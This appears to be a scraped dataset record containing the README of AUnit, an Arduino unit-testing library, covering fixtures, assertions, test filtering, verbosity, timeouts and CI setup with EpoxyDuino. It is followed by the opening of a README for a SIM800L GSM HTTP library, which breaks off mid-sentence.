you to place common data objects and methods into a class that can be shared among multiple test cases. this concept matches very closely to the test fixtures in google test.\nto create a test fixture:\nderives a new class from either testonce (if you want to run the test just once), or testagain (if you want to run the test repeatedly).\nadd any data objects inside the class.\noptionally add a virtual void setup() {...} method to perform any common initialization code. be sure to call the parent's setup() method in the first line to chain any setup() methods defined by the parents. there may be multiple parent classes.\noptionally add a virtual void teardown() {...} method to perform any common clean up code. be sure to call the parent's teardown() method in the last line to chain any teardown() methods defined by the parents. there may be multiple parent classes.\nadd any additional shared methods into this new class.\nto define your tests, use the testf() macro like this:\nclass customtestonce: public testonce {\nprotected:\n// optional\nvoid setup() override {\ntestonce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\ntestonce::teardown();\n}\nvoid assertcustomstuff() {\n...common code...\n}\nint sharedvalue;\n};\ntestf(customtestonce, calculate) {\n...test code here...\n}\nno constructor for customtestonce needs to be defined.\nunderneath the covers, the testf() macro creates a subclass named customtestonce_calculate which inherits from testonce class. the test code becomes the body of the customtestonce_calculate::once() method. the name of this test has the class name prepended, so it is customtestonce_calculate, which prevents name collision with other testf() tests with the same name using a different test fixture class.\nto define a continuous test, use the testingf() macro like this:\nclass customtestagain: public testagain {\nprotected:\n// optional\nvoid setup() override {\ntestagain::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\ntestagain::teardown();\n}\nvoid assertcustomstuff() {\n...common code...\n}\nint sharedvalue;\n};\ntestingf(customtestagain, calculate) {\n...test code here...\n}\nsimilarly, the testingf() macro creates a subclass named customtestagain_calculate, and the test code becomes the body of the customtestagain_calculate::again() method.\nsee examples/fixtures/fixtures.ino to see a working example of the testf() macro.\narduinounit compatibility: the testf() and testingf() macros, and the teardown() virtual method are available only in aunit (and google test), not arduinounit.\nearly return and delayed assertions\naunit (like arduinounit and google test) does not use c++ exceptions. instead, the various assertxxx() macros perform an early return if the condition evaluates to false. that means that the assertions can only bail out of the current method, not the calling method. if you are using test fixtures, and create a shared custom assert function, e.g. the assertcustomstuff() method above, any assertxxx() statements in shared method will bail out of that method only. the statement after the assertcustomstuff() will continue to execute.\nin other words, in the following example, if the assertcustomstuff() fails, then assertmorestuff() inside testf() will execute:\nclass customtestonce: public testonce {\nprotected:\nvoid assertcustomstuff() {\nassertequal(sharedvalue, 3);\n// this will not execute if the assertequal() above fails.\nassertless(...);\n}\nvoid assertmorestuff() {\nassertequal(...);\n}\nint sharedvalue;\n};\n// don't do this\ntestf(customtestonce, dontdothis) {\nassertcustomstuff();\n// this will execute even if assertcustomstuff() fails.\nassertmorestuff();\n}\n// do this instead\ntestf(customtestonce, dothis) {\nassertnofatalfailure(assertcustomstuff());\nassertnofatalfailure(assertmorestuff());\n}\nthe solution is to use the assertnofatalfailure(statement) macro which checks whether the inner statement returned with a fatal assertion. if so, then it returns immediately, preventing execution from continuing to the code that follows. this macro is modeled after the assert_no_fatal_failure(statement) macro in google test that provides the same functionality.\nmeta assertions\nthe following methods from arduinounit have also been implemented:\nchecktestdone(name)\nchecktestnotdone(name)\nchecktestpass(name)\nchecktestnotpass(name)\nchecktestfail(name)\nchecktestnotfail(name)\nchecktestskip(name)\nchecktestnotskip(name)\nchecktestexpire(name) [*]\nchecktestnotexpire(name) [*]\nasserttestdone(name)\nasserttestnotdone(name)\nasserttestpass(name)\nasserttestnotpass(name)\nasserttestfail(name)\nasserttestnotfail(name)\nasserttestskip(name)\nasserttestnotskip(name)\nasserttestexpire(name) [*]\nasserttestnotexpire(name) [*]\nthe checktestxxx() methods check the status of the test named name and returns a bool. the execution continues even if false.\nthe asserttestxxx() methods stops the unit test if the status check returns false, and prints assertion messages that look like this:\nassertion passed: test slow_pass is done, file aunittest.ino, line 366.\nassertion passed: test slow_pass is not failed, file aunittest.ino, line 372.\nassertion passed: test slow_skip is skipped, file aunittest.ino, line 448.\nassertion passed: test slow_skip is not timed out, file aunittest.ino, line 451.\n(the human readable version of being expired will always be timed out or not timed out on the serial output.)\nthe following macros define extern references to test case objects which live in other .cpp files. these are required for the above meta assertions if the test cases are defined in another file:\nexterntest()\nexterntesting()\nexterntestf()\nexterntestingf()\narduinounit compatibility: the methods marked by [*] are only available in aunit. also, the assertion messages are different. arduinounit reuses the format used by the assertxxx() macros, so prints something like the following:\nassertion passed: (test_slow_skip_instance.state=2) >= (test::done_skip=2), file\naunittest.ino, line 439.\naunit has a separate message handler to print a customized message for the asserttestxxx() meta assertion macros.\nunconditional termination\nthe following macros can be used inside the body of test() or testing() macro to terminate a test unconditionally. each macro prints a short message, and returns immediately from the test, much like an assertxxx() macro that fails.\npasstestnow() [*]\nfailtestnow() [*]\nskiptestnow() [*]\nexpiretestnow() [*]\nthe messages look like:\nstatus passed, file aunittest.ino, line 360.\nstatus failed, file aunittest.ino, line 378.\nstatus skipped, file aunittest.ino, line 380.\nstatus timed out, file aunittest.ino, line 391.\nthe following methods on the test class also set the status of the test, but these methods do not print any messages (which makes debugging difficult) and they do not terminate the test immediately.\npass() - test passed\nfail() - test failed\nskip() - test skipped\nexpire() - test timed out [*]\nin most cases, the failtestnow(), skiptestnow() and expiretestnow() macros are more useful than the equivalent methods in the test class. however, in a testing() loop test, the pass() method is probably better than the passtestnow() macro because we usually don't want to see an error message from a passing test.\narduinounit compatibility: the method(s) marked by [*] are only available in aunit.\noverridable methods\nthe following methods are defined at the test base class level:\nsetup()\nteardown()\nthe testonce class defines:\nonce()\nthe testagain class defines:\nagain()\narduinounit compatibility: these are functionally the same as arduinounit except with different class names. instead of test use testagain. instead of test::loop use testagain::again(). arduinounit does not support a teardown() method.\nrunning the tests\nwe run the test cases in the global loop() method by calling testrunner::run(). the tests are sorted according to the name of the test given in the argument in the test() or testing() macro.\neach call to the run() method causes one test case to run and be resolved. the next call to run() executes the next test case. this design allows the loop() method to perform a small amount of work and return periodically to allow the system to perform some actions. on some systems, such as the esp8266, an error is generated if loop() takes too much cpu time.\n...\nvoid loop() {\ntestrunner::run();\n}\narduinounit compatibility: this is equivalent to called test::run() in arduinounit. aunit sorts the tests in the same way as arduinounit. in arduinounit, each call to test::run() will process the entire list of currently active test cases. in aunit, each call to testrunner::run() performs only a single test case, then returns.\nfiltering test cases\nsix filtering methods are available on the testrunner class:\ntestrunner::include(pattern) - prefix match\ntestrunner::include(testclass, pattern) - prefix match\ntestrunner::exclude(pattern) - prefix match\ntestrunner::exclude(testclass, pattern) - prefix match\ntestrunner::includesub(substring) - substring match (v1.6)\ntestrunner::excludesub(substring) - substring match (v1.6)\nthese methods are called from the global setup() method, for example:\nvoid setup() {\ntestrunner::include(\"looping*\");\ntestrunner::exclude(\"customtestagain\", \"*\");\ntestrunner::include(\"customtestagain\", \"test*\");\ntestrunner::include(\"customtestagain\", \"test*\");\ntestrunner::includesub(\"net\");\ntestrunner::excludesub(\"net\");\n...\n}\nexcluded tests bypass their test::setup() and test::teardown() methods and terminate immediately. for the purposes of reporting, excluded tests are counted as \"skipped\".\nthe 2-argument versions of include() and exclude() correspond to the 2 arguments of testf() and testingf().\nthe filtering methods are also available as command line flags and arguments (--include, --exclude, --includesub --excludesub) if the test program is compiled using epoxyduino under a unix-like environment. see the epoxyduino section below.\nimplicit exclude all: if the first filtering request is an \"include\" (i.e. include(pattern), include(testclass, pattern), includesub(substring)), all tests are excluded by default initially, instead of being included by default. otherwise, the first \"include\" statement would have no effect.\narduinounit compatibility: the equivalent versions in arduinounit are test::exclude() and test::include() the matching algorithm in aunit is not as powerful as the one in arduinounit. aunit supports only a single wildcard character * and that character can appear only at the end if it is present. for example, the following are accepted:\ntestrunner::exclude(\"*\");\ntestrunner::include(\"f*\");\ntestrunner::exclude(\"flash_*\");\ntestrunner::include(\"looping*\");\ntestrunner::include(\"customtestonce\", \"flashtest*\");\naunit provides 2-argument versions of include() and exclude()\noutput printer\nthe default output printer is the serial instance. this can be changed using the testrunner::setprinter() method:\n#include <aunit.h>\nusing aunit::testrunner;\n...\nvoid setup() {\nserial1.begin(...);\ntestrunner::setprinter(&serial1);\n...\n}\nvoid loop() {\ntestrunner::run();\n}\narduinounit compatibility: this is the equivalent of the test::out static member variable in arduinounit.\ncontrolling the verbosity\nthe default verbosity of the test results can be controlled using the testrunner::setverbosity() method:\n#include <aunit.h>\nusing aunit::testrunner;\nusing aunit::verbosity;\n...\nvoid setup() {\n...\ntestrunner::setverbosity(verbosity::kall);\n...\n}\nevery test is assigned this default verbosity just before its test::setup() is called. a unit test can choose to modify the verbosity calling one of the following methods:\nvoid enableverbosity(uint8_t verbosity);\nenables the given verbosity, retaining all the others\nvoid disableverbosity(uint8_t verbosity);\ndisables the given verbosity, retaining all the others\nat the beginning of the test definition, like this:\ntest(enable_assertion_passed_messages) {\nenableverbosity(verbosity::kassertionpassed);\n...\n}\nthe values of verbosity are defined by the static constants of the verbosity utility class:\nverbosity::kassertionpassed\nverbosity::kassertionfailed\nverbosity::ktestpassed\nverbosity::ktestfailed\nverbosity::ktestskipped\nverbosity::ktestexpired\nverbosity::ktestrunsummary\nverbosity::kassertionall - enables all assert messages\nverbosity::ktestall\nsame as (ktestpassed | ktestfailed | ktestskipped | ktestexpired)\nverbosity::kdefault\nsame as (kassertionfailed | ktestall | ktestrunsummary )\nverbosity::kall - enables all messages\nverbosity::knone - disables all messages\narduinounit compatibility: the following arduinounit variables do not exist:\ntest::min_verbosity\ntest::max_verbosity\nthe bit field constants have slightly different names:\ntest_verbosity_tests_summary -> verbosity::ktestrunsummary\ntest_verbosity_tests_failed -> verbosity::ktestfailed\ntest_verbosity_tests_passed -> verbosity::ktestpassed\ntest_verbosity_tests_skipped -> verbosity::ktestskipped\ntest_verbosity_tests_all -> verbosity::ktestall\ntest_verbosity_assertions_failed -> verbosity::kassertionfailed\ntest_verbosity_assertions_passed -> verbosity::kassertionpassed\ntest_verbosity_assertions_all -> verbosity::kassertionall\ntest_verbosity_all -> verbosity::kall\ntest_verbosity_none -> verbosity::knone\n{no equivalent} <- verbosity::kdefault\n{no equivalent} <- verbosity::ktestexpired\nline number mismatch\naunit suffers from the same compiler/preprocessor bug as arduinounit that causes the built-in __line__ macro to be off by one. the solution is to add:\n#line 2 {file.ino}\nas the first line of a unit test sketch.\narduinounit compatibility: this problem is identical to arduinounit.\ntest framework messages\nassertion message\nthe various assertxxx() macros in aunit print a message upon pass or fail. for example, if the assertion was:\nint expected = 3;\nint counter = 4;\nassertequals(expected, counter);\nthe error message (if enabled, which is the default) is:\nassertion failed: (3) == (4), file aunittest.ino, line 134.\nasserts with bool values produce customized messages, printing \"true\" or \"false\" instead of using the print class default conversion to int:\nassertequals(true, false);\nassertion failed: (true) == (false), file aunittest.ino, line 134.\nsimilarly, the asserttrue() and assertfalse() macros provide more customized messages:\nbool ok = false;\nasserttrue(ok);\nassertion failed: (false) is true, file aunittest.ino, line 134.\nand\nbool ok = true;\nassertfalse(ok);\nassertion failed: (true) is false, file aunittest.ino, line 134.\narduinounit compatibility: arduinounit captures the arguments of the assertequal() macro and prints:\nassertion failed: (expected=3) == (counter=4), file aunittest.ino, line 134.\neach capture of the parameter string consumes flash memory space. if the unit test has numerous assertxxx() statements, the flash memory cost is expensive. aunit omits the parameters to reduce flash memory space by about 33%.\nthe messages for asserts with bool values are customized for better clarity (partially to compensate for the lack of capture of the string of the actual arguments, and are different from arduinounit.\nverbose mode message\nif you use the verbose header:\n#include <aunitverbose.h>\nthe assertion message will contain the string fragments of the arguments passed into the assertxxx() macros, like this:\nassertion failed: (expected=3) == (counter=4), file aunittest.ino, line 134.\nassertion failed: (ok=false) is true, file aunittest.ino, line 134.\narduinounit compatibility: the verbose mode produces the same messages as arduinounit, at the cost of increased flash memory usage.\ntest case summary\nas each test case finishes, the testrunner prints out the summary of the test case like this:\ntest bad failed.\ntest looping_pass passed.\ntest looping_skip skipped.\ntest looping_until timed out.\narduinounit compatibility: these are identifcal to arduinounit, except that the \"timed out\" status is new to aunit. see test timeout section below.\ntest runner summary\nat the end of the test run, the testrunner prints out the summary of all test cases, like this:\ntestrunner duration: 0.05 seconds.\ntestrunner summary: 12 passed, 0 failed, 2 skipped, 1 timed out, out of 15 test(s).\narduinounit compatibility: the message format is slightly different than arduinounit. i changed \"test summary\" to \"testrunner summary\" because the former looks identical to the message that could have been printed by a test(summary) test case. aunit also adds information about tests which timed out. see below.\ntest timeout\narduinounit compatibility: only available in aunit.\nfrom my experience, it seems incredibly easy to write a testing() test case which accidentally runs forever because the code forgets to call an explicit pass(), fail() or skip().\nthe testrunner in aunit applies a timeout value to all the test cases that it runs. the default timeout is 10 seconds. a timeout value of 0 means an infinite timeout, which means that the testing() test case may run forever. the value of the timeout is stored as a uint16_t type, so the maximum timeout is 65535 seconds or a bit over 18 hours.\ncurrently, the timeout value is global to all test cases. time out values for individual tests cannot be set independently. if a test does not finish before that time, then the test is marked as timed out (internally implemented by the test::expire() method) and a message is printed like this:\ntest looping_until timed out.\nthe timeout value can be changed by calling the static testrunner::settimeout() method. here is an example that sets the timeout to 30 seconds instead:\nvoid setup() {\n...\ntestrunner::settimeout(30);\n...\n}\narduinounit compatibility: only available in aunit.\ngoogletest adapter\nit may be possible to run simple unit tests written using google test api on an arduino platform by using the aunit/contrib/gtest.h adapter. this adapter layer provides a number of google test macros which map to their equivalent macros in aunit:\nassert_eq(e, a) - assertequal()\nassert_ne(e, a) - assertnotequal()\nassert_lt(e, a) - assertless()\nassert_gt(e, a) - assertmore()\nassert_le(e, a) - assertlessorequal()\nassert_ge(e, a) - assertmoreorequal()\nassert_streq(e, a) - assertequal()\nassert_strne(e, a) - assertnotequal()\nassert_strcaseeq(e, a) - assertstringcaseequal()\nassert_strcasene(e, a) - assertstringcasenotequal()\nassert_true(x) - asserttrue()\nassert_false(x) - assertfalse()\nassert_near(e, a, error) - assertnear()\nto use the gtest.h adapter, include the following headers:\n#include <aunit.h>\n#include <aunit/contrib/gtest.h>\nor\n#include <aunitverbose.h>\n#include <aunit/contrib/gtest.h>\ncommand line tools\neach unit test is an independent *.ino program. you can run it using your arduino ide. but there are 2 command line tools that can be used to run them.\nauniter\nthe auniter.sh script used to be part of this project, but now lives in its own auniter (https://github.com/bxparks/auniter) project. the auniter.sh script is a wrapper around:\narduino ide in command line mode, and\narduino cli tool\nusing auniter.sh, you can compile, upload and validate multiple aunit tests on multiple arduino boards using a single command.\nthe script can monitor the serial port and determine if the unit test passed or failed, and it will print out a summary of all unit tests at the end. full details are given in the auniter project, but here are some quick examples copied from the auniter/readme.md file:\n$ auniter envs\nlist the environments configured in the auniter.ini config file\n$ auniter ports\nlist the available serial ports and devices\n$ auniter verify nano blink.ino\nverify (compile) blink.ino using the env:nano environment\n$ auniter verify nano,esp8266,esp32 blink.ino\nverify blink.ino on 3 target environments (env:nano, env:esp8266, env:esp32)\n$ auniter upload nano:/dev/ttyusb0 blink.ino\nupload blink.ino to the env:nano target environment connected to /dev/ttyusb0\n$ auniter test nano:usb0 blinktest.ino\ncompile and upload blinktest.ino using the env:nano environment, upload it to the board at /dev/ttyusb0, then validate the output of the aunit unit test\n$ auniter test nano:usb0,esp8266:usb1,esp32:usb2 blinktest/ clocktest/\nupload and verify the 2 unit tests (blinktest/blinktest.ino, clocktest/clocktest.ino) on 3 target environments (env:nano, env:esp8266, env:esp32) located at the 3 respective ports (/dev/ttyusb0, /dev/ttyusb1, /dev/ttyusb2)\n$ auniter upmon nano:usb0 blink.ino\nupload the blink.ino sketch and monitor the serial port using a user-configurable terminal program (e.g. picocom) on /dev/ttyusb0\nepoxyduino\ninstead of running the unit tests on the actual microcontrollers themselves, you can compile and execute aunit unit tests natively on linux or macos machines using the epoxyduino (https://github.com/bxparks/epoxyduino) project. epoxyduino provides a minimal arduino programming environment that is usually sufficient to compile and run aunit test units on the unix host machine. it relies on the native c++ compiler, gnu make, and makefile files for each *.ino unit test like this:\napp_name := sampletest\narduino_libs := aunit\ninclude ../../../epoxyduino/epoxyduino.mk\nthe unit test is compiled into a binary (sampletest.out) using the `make command, and the binary can be executed like this:\n$ make\n$ ./sampletest.out\nhere are a few tips when writing unit tests to run under epoxyduino:\ndelay(1000)\nfor real arduino boards, you get more reliable unit tests if you add a delay(1000) at the start of the program. for epoxyduino, this is not necessary, so i recommend calling this only on real arduino boards, like this:\nvoid setup() {\n#ifdef arduino\ndelay(1000); // wait for stability on some boards, otherwise garage on serial\n#endif\n...\nexit() status code\non real arduino boards, the unit test (or any program for that matter) never terminates. the loop() function executes forever. on linux or macos using epoxyduino, the test program will terminate at the end through the exit() function. if the tests are successful (i.e. passing or skipped), it will call exit(0). if there are any failing tests (i.e. failed or timed out), it will call exit(1).\ncommand line flags and arguments\n(added in v1.6)\nthe standard arduino environment does not provide command line arguments, since a microcontroller does not normally provide a command line environment. however, if the aunit test program is compiled under epoxyduino, the standard unix command line parameters (argc and argv) become available through the extern int epoxy_argc and extern const char* const* epoxy_argv global variables. these allow the testrunner class to provide command line flags and arguments as follows:\n$ ./test.out --help\nusage: ./test.out [--help] [--include pattern,...] [--exclude pattern,...]\n[--includesub substring,...] [--excludesub substring,...]\n[--] [substring ...]\nexample, the following runs all tests with substring \"net\" or \"led\" in its name, and skips all others:\n$ ./test.out net led\nflags:\n--include pattern,...\ncomma-separated list of patterns to pass to the testrunner::include(pattern) method\n--exclude pattern,...\ncomma-separated list of patterns to pass to the testrunner::exclude(pattern) method\n--includesub substring,...\ncomma-separated list of substrings to pass to the testrunner::includesub(substring) method\n--excludesub substring,...\ncomma-separated list of substrings to pass to the testrunner::excludesub(substring) method\narguments:\nany space-separated list of words after the optional flags are passed to the testrunner::includesub(substring) method.\nthe command line flags and arguments are processed after any hardcoded calls to testrunner::include() and testrunner::exclude() methods in the global setup() method.\nthe flags and command line arguments are processed in order of appearance on the command line.\nsimilar to the hardcoded calls to testrunner::include() and testrunner::exclude(), if the first command line flag is an --include or --includesub, then all tests are excluded by default initially. otherwise, the first include flag would have no effect.\ncontinuous integration\nthere are several ways to incorporate aunit into a continuous integration system. at the infrastructure level, you can use either a system like jenkins running on a local machine, or use a cloud-based continuous integration system like github actions. for each of those infrastructures, you can choose to use the arduino ide or cli build tools, or you can use epoxyduino to compile and run against a linux or macos environment.\nthe option matrix looks like this:\n+----------------+-------------------------+------------------------+\n|\\ ci environment| | |\n| \\____________ | local (e.g. jenkins) | cloud (e.g. github) |\n| \\ | | |\n| build tool \\| | |\n+----------------+-------------------------+------------------------+\n| | * can execute tests | * verify compile-only |\n| | on microcontroller | * cannot actually run |\n| arduino | * complex setup and | tests on |\n| ide/cli | * maintenance | microcontroller |\n| | * can be slow | * complex installation |\n| | * (not recommended) | and setup |\n| | | * (unverified) |\n+----------------+-------------------------+------------------------+\n| | * verify execution on | * verify execution on |\n| | unix environment | unix environment |\n| epoxyduino | * faster than ide/cli | * simple setup and |\n| | * complex setup and | maintenance |\n| | and maintenance | * very fast |\n| | * (unnecessary) | * (recommended) |\n+----------------+-------------------------+------------------------+\narduino ide/cli + cloud\nthe big advantage of using the arduino ide/cli to run the aunit unit tests is that you can compile them using the precise compiler and tool chain that will be used against the specific microcontroller that you are interested in verifying. there can be subtle compiler differences (e.g. size of int) or differences in how the arduino programming environment was implemented (e.g. availability of the fpstr() macro). if you use a cloud-based ci infrastructure, then you must install the complete arduino ide/cli environment into your cloud test runner. although i think it's theoretically possible, i have never actually verified that this can be done.\narduino ide/cli + jenkins\nthis setup is described in continuous integration with jenkins, and it worked reasonably well for small number of unit tests. the problem is that the arduino ide is far too slow when the number of unit tests become non-trivial. and it also takes too much effort to maintain the local jenkins infrastructure. the jenkins environment seems to be brittle due to its complexity of all of its moving parts. this is the only environment where you can connect a real arduino microcontroller to the local machine and have the unit tests run on the actual microcontroller. perhaps for certain situations, running the unit tests on actual hardware is a requirement. but for most people, i no longer recommend this environment.\nepoxyduino + jenkins\nonce the jenkins environment is up and running, i have verified that it is easy to run the unit tests using epoxyduino, since it needs just a c++ compiler and gnu make. things will compile and run a lot faster than using the arduino ide/cli. however, this combination suffers from the same problem of maintaining the jenkins environment. if the unit tests are running in an unix environment anyway, it seems far easier to just run them in the cloud. so i don't recommend using this setup. just use a cloud ci provider as described below.\nepoxyduino + cloud (recommended)\na cloud-based continuous integration service like github actions is easy to setup for epoxyduino. often the c++ compiler and gnu make tools are already installed in the docker container used by the ci system. the only additional setup is to install epoxyduino, aunit and other dependent arduino libraries.\nhere are some example yaml files for github actions:\nhttps://github.com/bxparks/acetime/tree/develop/.github/workflows\nhttps://github.com/bxparks/acebutton/tree/develop/.github/workflows\nhttps://github.com/bxparks/aceroutine/tree/develop/.github/workflows\nhttps://github.com/bxparks/acecrc/tree/develop/.github/workflows\nin the various aunit_tests.yml files, the setup step installs the various dependent libraries using the git clone command, for example:\ngit clone https://github.com/bxparks/epoxyduino\ngit clone https://github.com/bxparks/aunit\nthese commands install the default branch for those repositories, which for most of my libraries will be the develop branch. this makes sense for me because i want the unit tests to run against the latest commits. however, for many others, it is probably better to use the master branch because it contains the stable releases:\ngit clone --branch master https://github.com/bxparks/epoxyduino\ngit clone --branch master https://github.com/bxparks/aunit\nusing epoxyduino with a cloud ci provider (like github actions) is my recommended configuration for running aunit tests because it is easy to setup and maintain and the tests run fast.\ntips\ncollection of useful tidbits.\ndebugging assertions in fixtures\nwhen using test fixtures with the testf() and testingf() macros, it's often useful to create helper assertions, such as the assertcustomstuff() below. debugging such assertion statements can be tricky. i've found that turning on messages for successful assertions (with a enableverbosity(verbosity::kassertionpassed)) statement can be very helpful:\nclass customtestonce: public testonce {\nprotected:\n// optional\nvoid setup() override {\ntestonce::setup();\n...setup code...\n}\n// optional\nvoid teardown() override {\n...teardown code...\ntestonce::teardown();\n}\nvoid assertcustomstuff() {\nassertequal(...);\n...\nfor (...) {\n...\nassertequal(...);\n...\n}\n}\nint sharedvalue;\n};\ntestf(customtestonce, calculate) {\nenableverbosity(verbosity::kassertionpassed);\n...test code here...\nassertcustomstuff();\n}\nclass hierarchy\nto support test fixtures in a more natural way, the class hierarchy in aunit is slightly different than arduinounit. in arduinounit we have a two level hierarchy:\ntest ::loop()\n^\n|\ntestonce ::once()\nin aunit, the functionality that supports the testing() macro has been migrated to a separate class called testagain, like this:\ntest ::loop()\n^\n|\nassertion\n^\n|\nmetaassertion\n^ ^\n/ \\\n/ \\\ntestagain testonce\n::again() ::once()\nnormally, deep inheritance hierarchies like this should be avoided. however, placing the assertion and metaassertion classes inside the test hierarchy allowed those assertion statements to have access to the internal states of the test instance. this made certain features (like the early return upon delayed failure) slightly easier to implement. for the most part, the end-users can ignore the existence of the assertion and metaassertion classes and think of this as a simple 2-level inheritance tree.\ntesting private helper methods\nthere is a school of thought which says that unit tests should test only the publically exposed methods of a class or library. i agree mostly with that sentiment, but not rigidly. i think it is sometimes useful to write unit tests for protected or private methods. for example, when creating a chain of small helper methods, which build up to larger publically exposed methods, it is extremely useful to write unit tests for the helper methods in isolation.\nnormally those helper methods would be private because they are used only within that class, and we don't want to expose them to the public api. one option is to make them public but add a comment in the function to say that it is exposed only for testing purposes. this does not seem satisfactory because users will tend to ignore such comments if the helper functions are useful.\ni think a better way is to keep the helper functions private but make the unit tests a friend class of the target class. the syntax for doing this can be tricky, it took me a number of attempts to get this right, especially if when using namespaces for the target class:\n//------------------- target.h -------------\n// auto-generated test class names.\nclass test_helper;\nclass targetsuite_helper;\nclass targettest_helper;\nnamespace mylib {\nclass target {\npublic:\nvoid publicmethod() {\n...\nint a = helper();\n...\n}\nprivate:\n// must have the global scope operator '::'\nfriend class ::test_helper;\nfriend class ::targetsuite_helper;\nfriend class ::targettest_helper;\nstatic int helper() {...}\n};\n}\n//------------------- targettest.ino -------------\n#include <aunit.h>\n#include \"target.h\"\nusing namespace aunit;\nusing namespace mylib;\ntest(helper) {\nassertequal(1, target::helper(...));\n}\ntest(targetsuite, helper) {\nassertequal(1, target::helper(...));\n}\nclass targettest: public testonce {\n...\n};\ntestf(targettest, helper) {\nassertequal(1, target::helper(...));\n}\nthe tricky part is that target.h must have forward declarations of the various auto-generated aunit test classes. and within the target class itsef, the friend declarations need to have a global scope :: specifier before the name of the test class.\nbenchmarks\naunit consumes as much as 65% less flash memory than arduinounit 2.2 on an avr platform (e.g. arduino uno, nano), and 30% less flash on the teensy-arm platform (e.g. teensy lc ). (arduinounit 2.3 reduces the flash memory by 30% or so, which means that aunit can still consume significantly less flash memory.)\nhere are the resource consumption (flash and static) numbers from acebuttontest containing 26 test cases using 331 assertxxx() statements, compiled using aunit and arduinounit 2.2 on 5 different microcontrollers:\n---------------------------+---------+-------------+-------------+\nplatform (resource) | max | arduinounit | aunit |\n---------------------------+---------+-------------+-------------|\narduino nano (flash) | 30720 | 54038 | 18928 |\narduino nano (static) | 2048 | 1061 | 917 |\n---------------------------+---------+-------------+-------------|\nteensy lc (flash) | 63488 | 36196 | 26496 |\nteensy lc (static) | 8192 | 2980 | 2780 |\n---------------------------+---------+-------------+-------------|\nteensy 3.2 (flash) | 262144 | 51236 | 37920 |\nteensy 3.2 (static) | 65536 | 5328 | 5236 |\n---------------------------+---------+-------------+-------------|\nesp8266 - esp-12e (flash) | 1044464 | does not | 268236 |\nesp8266 - esp-12e (static) | 81920 | compile | 33128 |\n---------------------------+---------+-------------+-------------|\nesp8266 - esp-01 (flash) | 499696 | does not | 268236 |\nesp8266 - esp-01 (static) | 47356 | compile | 33128 |\n---------------------------+---------+-------------+-------------+\nnot all unit test sketches will experience a savings of 65% of flash memory with aunit, but a savings of 30-50% seems to be common.\nsystem requirements\nhardware\nthe library is tested on the following boards:\narduino nano clone (16 mhz atmega328p)\nsparkfun pro micro clone (16 mhz atmega32u4)\nsamd21 m0 mini board (arduino zero compatible, 48 mhz arm cortex-m0+)\nstm32 blue pill (stm32f103c8, 72 mhz arm cortex-m3)\nnodemcu 1.0 (esp-12e module, 80 mhz esp8266)\nwemos d1 mini (esp-12e module, 80 mhz esp8266)\nesp32 dev board (esp-wroom-32 module, 240 mhz dual core tensilica lx6)\nteensy 3.2 (96 mhz arm cortex-m4)\ni will occasionally test on the following hardware as a sanity check:\nmini mega 2560 (arduino mega 2560 compatible, 16 mhz atmega2560)\nteensy lc (48 mhz arm cortex-m0+)\nthe following boards are not supported:\nany platform using the arduinocore-api (https://github.com/arduino/arduinocore-api), such as:\nmegaavr (e.g. nano every) using arduinocore-megaavr (https://github.com/arduino/arduinocore-megaavr/)\nsamd21 boards (e.g. mkrzero) using arduinocore-samd (https://github.com/arduino/arduinocore-samd) starting with arduino:samd version >= 1.8.10\nraspberry pi pico (rp2040) using arduino-pico (https://github.com/earlephilhower/arduino-pico)\ntool chain\nthis library was validated using:\narduino ide 1.8.13\narduino cli 0.14.0\narduino avr boards 1.8.3\narduino samd boards 1.8.9\nsparkfun avr boards 1.1.13\nsparkfun samd boards 1.8.1\nstm32duino 2.0.0\nesp8266 arduino 2.7.4\nesp32 arduino 1.0.6\nteensyduino 1.54\nthis library is not compatible with:\nany platform using the arduinocore-api, for example:\narduino samd boards >=1.8.10\narduino megaavr\nmegacorex\n(see issue #56 and issue #66).\nit should work with platformio but i have not tested it extensively.\noperating system\ni use ubuntu 20.04 for the vast majority of my development. i expect that the library will work fine under macos and windows, but i have not tested them.\nlicense\nmit license\nfeedback and support\nif you have any questions, comments, or feature requests for this library, please use the github discussions for this project. if you have bug reports, please file a ticket in github issues. feature requests should go into discussions first because they often have alternative solutions which are useful to remain visible, instead of disappearing from the default view of the issue tracker after the ticket is closed.\nplease refrain from emailing me directly unless the content is sensitive. the problem with email is that i cannot reference the email conversation when other people ask similar questions later.\nauthors\ncreated by brian t. park (brian@xparks.net).\nthe google test adapter (gtest.h) was created by chris johnson (chrisjohnsonmail@gmail.com).\n@brewmanz increased the maximum allowed value of testrunner::settimeout() from 255 seconds to 65535 seconds (18.2 hours). (see issue #57).\nthe design and syntax of many macros (e.g. test(), assertxxx()) were borrowed from the arduinounit project to allow aunit to be almost a drop-in replacement. many thanks to the arduinounit team for creating such an easy-to-use api.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000432, "year": null}, {"Unnamed: 0": 2497, "autor": 457, "date": null, "content": "Arduino SIM800L HTTP connector\nArduino driver for GSM/GPRS module SIMCom SIM800L to make HTTP/S connections with GET and POST methods\nThis is a comprehensive Arduino library to make HTTP or HTTPS communication through the SIMCom SIM800L module. The library has been designed to limit the memory usage by working with the same shared buffer all the time.\nThe SIM800L is a GSM/GPRS module built by SIMCom. The communication with the SIM800L module relies on AT commands. The available AT commands are described in the SIM800 series AT Command Manual.\nSupported features in this library:\nPower management of the SIM800L module\nNetwork registration and signal strengh measurement\nGPRS connectivity and setup (APN with or without username and password)\nHTTP and HTTPS (SSL based on in-built IP stack, see Security concerns)\nGET and POST methods\nSoftwareSerial and HardwareSerial links\nConfigurable debug serial\nLimited memory usage\nTo know before starting...\nThe original module is working with an input voltage of 3.7V to 4.2V. So, don't connect the naked module directly on the Arduino. I personally use a module with voltage convertors from/to 5V like this one.\nAs the chipset can draw 2A maximum, it is better to use an external power source. Using the USB power through the computer is not enough while HTTP communication.\nThere are different firmware version of the SIM800L on the market. The HTTPS connectivity is available only for R14 and above. (You can check your version with the examples BasicTest_HardwareSerial or BasicTest_SoftSerial)\nThe firmware of the SIM800L is quite old and doesn't support the latest cryptographic protocols which could lead to some issues while connecting backends (typically errors 605 and 606). Read also the section below about security concerns.\nHow to install the library?\nThe easiest way to install the library is to go to the Library manager of the Arduino IDE and install the library.\nIn the Arduino IDE, go into menu Tools -> Manage Libraries...\nSearch for SIM800L\nInstall SIM800L HTTP connector by Olivier Staquet\nExamples\nYou will find examples in the repository to make HTTPS GET and HTTPS POST.\nWe are using the Postman Echo service to illustrate the communication with an 